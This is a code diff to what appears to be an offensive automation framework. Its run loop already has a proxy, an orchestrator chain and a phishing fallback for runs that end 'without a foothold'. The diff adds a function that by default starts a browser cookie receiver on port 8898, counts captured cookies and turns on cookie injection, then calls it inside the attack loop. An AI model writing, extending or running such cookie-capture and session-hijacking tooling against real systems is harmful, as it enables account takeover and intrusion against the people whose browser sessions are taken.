@@ -472,6 +472,28 @@ def _start_proxy(engine, params: dict) -> None:
         print_warn(f"proxy autostart skipped: {exc}")
 
 
+def _start_browser_sync(params: dict) -> None:
+    """Start the browser cookie sync receiver when payload asks for it."""
+    if not bool((params or {}).get("browser_sync_enabled", True)):
+        return
+    try:
+        port = int((params or {}).get("browser_sync_port", 8898) or 8898)
+    except (TypeError, ValueError):
+        port = 8898
+    try:
+        from modules import browser_sync
+
+        status = browser_sync.start_receiver(port=port)
+        if status.get("running"):
+            inject = bool((params or {}).get("browser_sync_inject", True))
+            print_msg(
+                f"[*] browser sync {status['host']}:{status['port']} "
+                f"cookies={status.get('cookies', 0)} inject={'on' if inject else 'off'}"
+            )
+    except Exception as exc:
+        print_warn(f"browser sync autostart skipped: {exc}")
+
+
 def _maybe_phishing_fallback(result: dict, config: LoopRunConfig, params: dict) -> dict:
     """Append the phishing handoff when the run ended without a foothold.
 
@@ -1102,6 +1124,7 @@ def run_loop(shell, params: dict, config: LoopRunConfig) -> dict:
         pass
     _prepare_engine(engine, shell, config, params)
     _start_proxy(engine, params)
+    _start_browser_sync(params)
     print_msg(f"[*] orchestrator chain: {'/'.join(engine.ORCHESTRATOR_CHAIN)}")
     if _budget_declined(config):
         return {"task_id": config.task_id, "cancelled": True, "error": "budget declined"}
